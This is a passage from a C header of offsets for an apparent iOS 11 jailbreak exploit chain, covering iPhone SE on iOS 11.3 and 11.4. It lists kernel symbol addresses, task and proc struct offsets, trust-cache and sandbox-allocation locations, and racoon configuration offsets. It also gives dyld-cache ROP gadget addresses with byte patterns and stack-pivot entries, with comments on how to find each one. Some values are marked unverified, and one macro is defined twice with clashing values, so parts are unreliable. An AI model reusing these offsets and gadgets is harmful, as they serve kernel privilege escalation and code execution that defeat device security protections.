#define OFF_OSUNSERIALIZEXML 0xfffffff0074e8f38 // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
#define OFF_PROC_FIND 0xfffffff0073f8ba4 // symbol (_proc_find)
#define OFF_PROC_RELE 0xfffffff0073f8b14 // symbol (_proc_rele)
#define OFF_SMALLOC 0xfffffff006b1acb0 // found by searching for "sandbox memory allocation failure"
#define OFF_IPC_PORT_ALLOC_SPECIAL 0xfffffff0070b9328 // \"ipc_processor_init\" in processor_start -> call above
#define OFF_IPC_KOBJECT_SET 0xfffffff0070cf2c8 // above _mach_msg_send_from_kernel_proper (2nd above for 10.3.4)
#define OFF_IPC_PORT_MAKE_SEND 0xfffffff0070b8aa4 // first call in long path of KUNCUserNotificationDisplayFromBundle
#define OFF_ADD_X0_X0_RET 0xfffffff0073ce75c // gadget (or _csblob_get_cdhash)
#define OFF_KERNEL_TASK 0xfffffff0075dd048 // symbol (_kernel_task)
#define OFF_KERN_PROC 0xfffffff0075dd0a0 // symbol (_kernproc)
#define OFF_ROOTVNODE 0xfffffff0075dd088 // symbol (_rootvnode)
#define OFF_REALHOST 0xfffffff0075e2b98 // _host_priv_self -> adrp addr
#define OFF_ZONE_MAP 0xfffffff0075ffe50 // str 'zone_init: kmem_suballoc failed', first qword above
#define OFF_OSBOOLEAN_TRUE 0xfffffff00764c468 //__ZN9OSBoolean11withBooleanEb -> first adrp addr (isn't used anywhere tho)
#define OFF_TRUST_CACHE 0xfffffff0076b8ee8 // (on iOS 10.3.4, use "%s: trust cache already loaded with matching UUID, ignoring\n", store below call to _lck_mtx_lock in same function) "%s: trust cache loaded successfully.\n" store above
#define OFF_IOSURFACE_ROOT_USERCLIENT 0xfffffff006eb8e10 // (on iOS 10.3.4, search "IOSurfaceRootUserClient", store in function below first reference) 'iometa -Csov IOSurfaceRootUserClient kernel', vtab=...
#define OFF_IS_TASK 0x28 // "ipc_task_init", lower of two final offsets to a local variable in decompiled code
#define OFF_TASK_ITK_SELF 0xd8 // first reference of "ipc_task_reset", offset after _lck_mtx_lock
#define OFF_ITK_REGISTERED 0x2f0 // "ipc_task_init", first comparison below to parameter, first str offset in not zero branch
#define OFF_IPR_SIZE 0x8 // "ipc_object_copyout_dest: strange rights", offset of second ldr in function below (ipc_port_request->name->size, long path: search all instances of 0x10000003 to find _kernel_rpc_mach_port_construct_trap, needs to have a copyin call, and travel chain)
#define OFF_SIZEOF_TASK 0x5c8 // str "tasks", mov offset below (size of entire task struct)
#define OFF_PROC_TASK 0x18 // "PMTellAppWithResponse - Suspended", second offset above (proc->task)
#define OFF_PROC_P_CSFLAGS 0x2a8 // _cs_restricted, first ldr offset (proc->p_csflags)
#define OFF_TASK_T_FLAGS 0x3a0 // __ZN12IOUserClient18clientHasPrivilegeEPvPKc, in equal to 0 branch of foregroud strncmp, in function on iOS 10 (task->t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_ADDR 0x3a8 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_addr, theoretically just +0x8 from t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_SIZE 0x3b0 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_size, theoretically just +0x10 from t_flags)
#define OFF_CREATE_OUTSIZE 0xbc8 // TODO: prove this
#define OFF_CREATE_SURFACE 0 // static, IOSurfaceCreate is method 0 of IOSurfaceRootUserClient
#define OFF_CREATE_SURFACE 9 // static, IOSurfaceSetValue is method 9 of IOSurfaceRootUserClient
#define OFF_ANCHOR 0x76199d8 // VERIFY: "unable to determine boot cpu!", [x*, 0x78]
#define OFF_IOUC_IPC 0x9c

// iPhone SE (1st gen) (iPhone8,4), iOS 11.3
#elif (N69AP & IOS_11_3)
#define OFF_KERNEL_IMAGE_BASE 0xfffffff007004000 // static
#define OFF_COPYIN 0xfffffff0071a7090 // symbol (_copyin)
#define OFF_COPYOUT 0xfffffff0071a72b4 // symbol (_copyout)
#define OFF_CURRENT_TASK 0xfffffff0070f76c4 // symbol (_current_task)
#define OFF_GET_BSDTASK_INFO 0xfffffff00710cdc0 // symbol (_get_bsdtask_info)
#define OFF_VM_MAP_WIRE_EXTERNAL 0xfffffff007153484 // symbol (_vm_map_wire_external)
#define OFF_VFS_CONTEXT_CURRENT 0xfffffff0071f9a04 // symbol (_vfs_context_current)
#define OFF_VNODE_LOOKUP 0xfffffff0071db710 // symbol (_vnode_lookup)
#define OFF_OSUNSERIALIZEXML 0xfffffff0074e2404 // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
#define OFF_PROC_FIND 0xfffffff0073f35b8 // symbol (_proc_find)
#define OFF_PROC_RELE 0xfffffff0073f3528 // symbol (_proc_rele)
#define OFF_SMALLOC 0xfffffff006b5ecb0 // found by searching for "sandbox memory allocation failure"
#define OFF_IPC_PORT_ALLOC_SPECIAL 0xfffffff0070b915c // \"ipc_processor_init\" in processor_start -> call above
#define OFF_IPC_KOBJECT_SET 0xfffffff0070cf30c // above _mach_msg_send_from_kernel_proper (2nd above for 10.3.4)
#define OFF_IPC_PORT_MAKE_SEND 0xfffffff0070b88d8 // first call in long path of KUNCUserNotificationDisplayFromBundle
#define OFF_ADD_X0_X0_RET 0xfffffff0073c96a8 // gadget (or _csblob_get_cdhash)
#define OFF_KERNEL_TASK 0xfffffff0075d5048 // symbol (_kernel_task)
#define OFF_KERN_PROC 0xfffffff0075d50a0 // symbol (_kernproc)
#define OFF_ROOTVNODE 0xfffffff0075d5088 // symbol (_rootvnode)
#define OFF_REALHOST 0xfffffff0075dab98 // _host_priv_self -> adrp addr
#define OFF_ZONE_MAP 0xfffffff0075f7e50 // str 'zone_init: kmem_suballoc failed', first qword above
#define OFF_OSBOOLEAN_TRUE 0xfffffff007644418 // __ZN9OSBoolean11withBooleanEb -> first adrp addr (isn't used anywhere tho)
#define OFF_TRUST_CACHE 0xfffffff0076b0ee8 // (on iOS 10.3.4, use "%s: trust cache already loaded with matching UUID, ignoring\n", store below call to _lck_mtx_lock in same function) "%s: trust cache loaded successfully.\n" store above
#define OFF_IOSURFACE_ROOT_USERCLIENT 0xfffffff006e88c50 // (on iOS 10.3.4, search "IOSurfaceRootUserClient", store in function below first reference) 'iometa -Csov IOSurfaceRootUserClient kernel', vtab=...
#define OFF_IS_TASK 0x28 // "ipc_task_init", lower of two final offsets to a local variable in decompiled code
#define OFF_TASK_ITK_SELF 0xe0 // first reference of "ipc_task_reset", offset after _lck_mtx_lock
#define OFF_ITK_REGISTERED 0x2f0 // "ipc_task_init", first comparison below to parameter, first str offset in not zero branch
#define OFF_IPR_SIZE 0x8 // "ipc_object_copyout_dest: strange rights", offset of second ldr in function below (ipc_port_request->name->size, long path: search all instances of 0x10000003 to find _kernel_rpc_mach_port_construct_trap, needs to have a copyin call, and travel chain)
#define OFF_SIZEOF_TASK 0x5c8 // str "tasks", mov offset below (size of entire task struct)
#define OFF_PROC_TASK 0x18 // "PMTellAppWithResponse - Suspended", second offset above (proc->task)
#define OFF_PROC_P_CSFLAGS 0x2a8 // _cs_restricted, first ldr offset (proc->p_csflags)
#define OFF_TASK_T_FLAGS 0x3a0 // __ZN12IOUserClient18clientHasPrivilegeEPvPKc, in equal to 0 branch of foregroud strncmp, in function on iOS 10 (task->t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_ADDR 0x3a8 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_addr, theoretically just +0x8 from t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_SIZE 0x3b0 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_size, theoretically just +0x10 from t_flags)
#define OFF_CREATE_OUTSIZE 0xbc8 // TODO: prove this
#define OFF_CREATE_SURFACE 0 // static, IOSurfaceCreate is method 0 of IOSurfaceRootUserClient
#define OFF_SET_VALUE 9 // static, IOSurfaceSetValue is method 9 of IOSurfaceRootUserClient
#define OFF_ANCHOR 0x76199d8 // VERIFY: "unable to determine boot cpu!", [x*, 0x78]
#define OFF_IOUC_IPC 0x9c

#define OFF_ISAKMP_CFG_CONFIG_DNS4 0x100067c10 + 0x8 // second reference of "No more than %d DNS", first adr in switch case 0x77, add 0x8
#define OFF_LCCONF 0x1000670e0 // "failed to set my ident: %s", value being offset by 0xb0 (0x6c on 32-bit)
#define OFF_DNS4_ARRAY_TO_LCCONF -(OFF_ISAKMP_CFG_CONFIG_DNS4 - OFF_LCCONF) // -((isakmp_cfg_config_addr()+0x28-4*8)-lcconf_addr())
#define OFF_STR_BUFF 8 // based on the pivot gadget below (the x21 gadget will do a double deref based on specific value on a buffer we control so we need to know it's offset)
#define OFF_MAX_SLIDE 0x4810000 // read 8 bytes at OFF_OLD_CACHE_ADDR + 0xf0
#define OFF_SLIDE_VALUE 0x4000 // hardcode that one
#define OFF_PIVOT_X21 0x199bb31a8 // search a8 06 40 f9 09 01 40 f9 29 1d 40 f9 e1 03 00 aa e0 03 08 aa 20 01 3f d6
#define OFF_PIVOT_X21_X9 0x50 - 0x38 // this is not needed on 11.1.2 but because 11.3.1 and above lack the original x21 gadget we need to introduce that one here
#define OFF_MEMMOVE 0x1ab680d20 // strlcpy second branch
#define OFF_LCCONF_COUNTER 0x10c // "error allocating splitdns list buffer", switch case 0x87 below, first str offset
#define OFF_CACHE_TEXT_SEG_SIZE 0x30000000 // we can get that by parsing the segments from the cache (but this is always enough)
#define OFF_OLD_CACHE_ADDR 0x180000000 // the first unslid address of the dyld shared cache
#define OFF_NEW_CACHE_ADDR 0x1c0000000 // you might want to change this because it might not work on the 5S but it should be fine for us
#define OFF_BEAST_GADGET 0x1a1632494 // search the dyld cache for e4 03 16 aa e5 03 14 aa e6 03 15 aa e7 03 13 aa e0 03 1a aa e1 03 19 aa e2 03 18 aa e3 03 17 aa 60 03 3f d6 fd 7b 47 a9 f4 4f 46 a9 f6 57 45 a9 f8 5f 44 a9 fa 67 43 a9 fc 6f 42 a9 e9 23 41 6d ff 03 02 91 c0 03 5f d6
#define OFF_STR_X0_GADGET 0x197d94ac8 // search the dyld cache for 60 16 00 f9 00 00 80 52 fd 7b 41 a9 f4 4f c2 a8 c0 03 5f d6
#define OFF_STR_X0_GADGET_OFF 0x28 // based on the gadget above (at which offset it stores x0 basically)
#define OFF_CBZ_X0_GADGET 0x188cffe5c // __ZN3rtc9TaskQueue12QueueContext13DeleteContextEPv
#define OFF_CBZ_X0_X16_LOAD 0x1b1c0e000 + 0x2c8 // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
#define OFF_ADD_X0_GADGET 0x18518bb90 // search the dyld cache for a0 02 14 8b fd 7b 42 a9 f4 4f 41 a9 f6 57 c3 a8 c0 03 5f d6
#define OFF_ERRNO 0x1b30f1000 + 0xff8 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
#define OFF_NDR_RECORD 0x1b1896018 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // address of label _NDR_record, we need to map it before using it
#define OFF_LONGJMP realsym(dyld_cache_path, "__longjmp") // dlsym of __longjmp
#define OFF_STACK_PIVOT 0x180b12714 // longjmp from mov x2, sp
#define OFF_MMAP realsym(dyld_cache_path, "___mmap") // dlsym of ___mmap
#define OFF_MEMCPY realsym(dyld_cache_path, "_memcpy") // dlsym of _memcpy
#define OFF_OPEN realsym(dyld_cache_path, "_open") // dlsym of ___open
#define OFF_FCNTL_RAW realsym(dyld_cache_path, "___fcntl") // dlsym of ___fcntl
#define OFF_RAW_MACH_VM_REMAP realsym(dyld_cache_path, "_mach_vm_remap") // dlsym of _mach_vm_remap
#define OFF_ROOTDOMAINUC_VTAB 0xfffffff00708e158 // find __ZTV20RootDomainUserClient in kernel, first non-zero byte
#define OFF_SWAPPREFIX_ADDR 0xfffffff0075a98cc // search for the string "/private/var/vm/swapfile" (or "/var/vm/swapfile" on 10.3.4) in the kernel that's the right address

// iPhone SE (1st gen) (iPhone8,4), iOS 11.4
#elif (N69AP & IOS_11_4)
#define OFF_KERNEL_IMAGE_BASE 0xfffffff007004000 // static
#define OFF_COPYIN 0xfffffff0071a71cc // symbol (_copyin)
#define OFF_COPYOUT 0xfffffff0071a73f0 // symbol (_copyout)
#define OFF_CURRENT_TASK 0xfffffff0070f4c4c // symbol (_current_task)
#define OFF_GET_BSDTASK_INFO 0xfffffff00710a348 // symbol (_get_bsdtask_info)
#define OFF_VM_MAP_WIRE_EXTERNAL 0xfffffff007153574 // symbol (_vm_map_wire_external)
#define OFF_VFS_CONTEXT_CURRENT 0xfffffff0071f9bcc // symbol (_vfs_context_current)
#define OFF_VNODE_LOOKUP 0xfffffff0071db8d8 // symbol (_vnode_lookup)
#define OFF_OSUNSERIALIZEXML 0xfffffff0074e2a58 // symbol (__Z16OSUnserializeXMLPKcPP8OSString)
#define OFF_PROC_FIND 0xfffffff0073f3b68 // symbol (_proc_find)
#define OFF_PROC_RELE 0xfffffff0073f3ad8 // symbol (_proc_rele)
#define OFF_SMALLOC 0xfffffff006b57cb0 // found by searching for "sandbox memory allocation failure"
#define OFF_IPC_PORT_ALLOC_SPECIAL 0xfffffff0070b915c // \"ipc_processor_init\" in processor_start -> call above
#define OFF_IPC_KOBJECT_SET 0xfffffff0070cf30c // above _mach_msg_send_from_kernel_proper (2nd above for 10.3.4)
#define OFF_IPC_PORT_MAKE_SEND 0xfffffff0070b88d8 // first call in long path of KUNCUserNotificationDisplayFromBundle
#define OFF_ADD_X0_X0_RET 0xfffffff0073c9c58 // gadget (or _csblob_get_cdhash)
#define OFF_KERNEL_TASK 0xfffffff0075d9048 // symbol (_kernel_task)
#define OFF_KERN_PROC 0xfffffff0075d90a0 // symbol (_kernproc)
#define OFF_ROOTVNODE 0xfffffff0075d9088 // symbol (_rootvnode)
#define OFF_REALHOST 0xfffffff0075deb98 // _host_priv_self -> adrp addr
#define OFF_ZONE_MAP 0xfffffff0075fbe50 // str 'zone_init: kmem_suballoc failed', first qword above
#define OFF_OSBOOLEAN_TRUE 0xfffffff007648428 // OSBoolean::withBoolean -> first adrp addr (isn't used anywhere tho)
#define OFF_TRUST_CACHE 0xfffffff0076b4ee8 // (on iOS 10.3.4, use "%s: trust cache already loaded with matching UUID, ignoring\n", store below call to _lck_mtx_lock in same function) "%s: trust cache loaded successfully.\n" store above
#define OFF_IOSURFACE_ROOT_USERCLIENT 0xfffffff006e88e50 // (on iOS 10.3.4, search "IOSurfaceRootUserClient", store in function below first reference) 'iometa -Csov IOSurfaceRootUserClient kernel', vtab=...
#define OFF_IS_TASK 0x28 // "ipc_task_init", lower of two final offsets to a local variable in decompiled code
#define OFF_TASK_ITK_SELF 0xd8 // first reference of "ipc_task_reset", offset after _lck_mtx_lock
#define OFF_ITK_REGISTERED 0x2f0 // "ipc_task_init", first comparison below to parameter, first str offset in not zero branch
#define OFF_IPR_SIZE 0x8 // "ipc_object_copyout_dest: strange rights", offset of second ldr in function below (ipc_port_request->name->size, long path: search all instances of 0x10000003 to find _kernel_rpc_mach_port_construct_trap, needs to have a copyin call, and travel chain)
#define OFF_SIZEOF_TASK 0x5c8 // str "tasks", mov offset below (size of entire task struct)
#define OFF_PROC_TASK 0x18 // "PMTellAppWithResponse - Suspended", second offset above (proc->task)
#define OFF_PROC_P_CSFLAGS 0x2a8 // _cs_restricted, first ldr offset (proc->p_csflags)
#define OFF_TASK_T_FLAGS 0x3a0 // __ZN12IOUserClient18clientHasPrivilegeEPvPKc, in equal to 0 branch of foregroud strncmp, in function on iOS 10 (task->t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_ADDR 0x3a8 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_addr, theoretically just +0x8 from t_flags)
#define OFF_TASK_ALL_IMAGE_INFO_SIZE 0x3b0 // "created task is not a member of a resource coalition", search 0x5f (task->all_image_info_size, theoretically just +0x10 from t_flags)
#define OFF_CREATE_OUTSIZE 0xbc8 // TODO: prove this
#define OFF_CREATE_SURFACE 0 // static, IOSurfaceCreate is method 0 of IOSurfaceRootUserClient
#define OFF_SET_VALUE 9 // static, IOSurfaceSetValue is method 9 of IOSurfaceRootUserClient
#define OFF_ANCHOR 0x76199d8 // VERIFY: "unable to determine boot cpu!", [x*, 0x78]
#define OFF_IOUC_IPC 0x9c

#define OFF_ISAKMP_CFG_CONFIG_DNS4 0x100067c10 + 0x8 // second reference of "No more than %d DNS", first adr in switch case 0x77, add 0x8
#define OFF_LCCONF 0x1000670e0 // "failed to set my ident: %s", value being offset by 0xb0 (0x6c on 32-bit)
#define OFF_DNS4_ARRAY_TO_LCCONF -(OFF_ISAKMP_CFG_CONFIG_DNS4 - OFF_LCCONF) // -((isakmp_cfg_config_addr()+0x28-4*8)-lcconf_addr())
#define OFF_STR_BUFF 8 // VERIFY! based on the pivot gadget below (the x21 gadget will do a double deref based on specific value on a buffer we control so we need to know it's offset)
#define OFF_MAX_SLIDE 0x4678000 // read 8 bytes at OFF_OLD_CACHE_ADDR + 0xf0
#define OFF_SLIDE_VALUE 0x4000 // hardcode that one
#define OFF_PIVOT_X21 0x199c4b93c // search a8 06 40 f9 09 01 40 f9 29 1d 40 f9 e1 03 00 aa e0 03 08 aa 20 01 3f d6
#define OFF_PIVOT_X21_X9 0x50 - 0x38 // VERIFY! this is not needed on 11.1.2 but because 11.3.1 and above lack the original x21 gadget we need to introduce that one here
#define OFF_MEMMOVE 0x1ab7b0d50 // strlcpy second branch
#define OFF_LCCONF_COUNTER 0x10c // "error allocating splitdns list buffer", switch case 0x87 below, first str offset
#define OFF_CACHE_TEXT_SEG_SIZE 0x30000000 // we can get that by parsing the segments from the cache (but this is always enough)
#define OFF_OLD_CACHE_ADDR 0x180000000 // the first unslid address of the dyld shared cache
#define OFF_NEW_CACHE_ADDR 0x1c0000000 // you might want to change this because it might not work on the 5S but it should be fine for us
#define OFF_BEAST_GADGET 0x1a16e6494 // search the dyld cache for e4 03 16 aa e5 03 14 aa e6 03 15 aa e7 03 13 aa e0 03 1a aa e1 03 19 aa e2 03 18 aa e3 03 17 aa 60 03 3f d6 fd 7b 47 a9 f4 4f 46 a9 f6 57 45 a9 f8 5f 44 a9 fa 67 43 a9 fc 6f 42 a9 e9 23 41 6d ff 03 02 91 c0 03 5f d6
#define OFF_STR_X0_GADGET 0x197e1eac8 // search the dyld cache for 60 16 00 f9 00 00 80 52 fd 7b 41 a9 f4 4f c2 a8 c0 03 5f d6
#define OFF_STR_X0_GADGET_OFF 0x28 // VERIFY! based on the gadget above (at which offset it stores x0 basically)
#define OFF_CBZ_X0_GADGET 0x188d340bc // __ZN3rtc9TaskQueue12QueueContext13DeleteContextEPv
#define OFF_CBZ_X0_X16_LOAD 0x1b1d72000 + 0x4c8 // decode the gadget above there will be a jump, follow that jump and decode the adrp and add there
#define OFF_ADD_X0_GADGET 0x18519cb90 // search the dyld cache for a0 02 14 8b fd 7b 42 a9 f4 4f 41 a9 f6 57 c3 a8 c0 03 5f d6
#define OFF_ERRNO 0x1b3263000 + 0xff8 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // we can get that by getting a raw syscall (for example __mmap, then searching for a branch following that and then searching for an adrp and a str)
#define OFF_NDR_RECORD 0x1b1896018 + OFF_NEW_CACHE_ADDR - OFF_OLD_CACHE_ADDR // VERIFY! address of label _NDR_record, we need to map it before using it
#define OFF_LONGJMP realsym(dyld_cache_path, "__longjmp") // dlsym of __longjmp
#define OFF_STACK_PIVOT 0x180b12714 // longjmp from mov x2, sp
#define OFF_MMAP realsym(dyld_cache_path, "___mmap") // dlsym of ___mmap
#define OFF_MEMCPY realsym(dyld_cache_path, "_memcpy") // dlsym of _memcpy
#define OFF_OPEN realsym(dyld_cache_path, "_open") // dlsym of ___open
#define OFF_FCNTL_RAW realsym(dyld_cache_path, "___fcntl") // dlsym of ___fcntl
#define OFF_RAW_MACH_VM_REMAP realsym(dyld_cache_path, "_mach_vm_remap") // dlsym of _mach_vm_remap
#define OFF_ROOTDOMAINUC_VTAB 0xfffffff00708e158 // find __ZTV20RootDomainUserClient in kernel, first non-zero byte
#define OFF_SWAPPREFIX_ADDR 0xfffffff0075ad8cc // search for the string "/private/var/vm/swapfile" (or "/var/vm/swapfile" on 10.3.4) in the kernel that's the right address

#else
#error No offsets are defined. :(
#endif

#endif
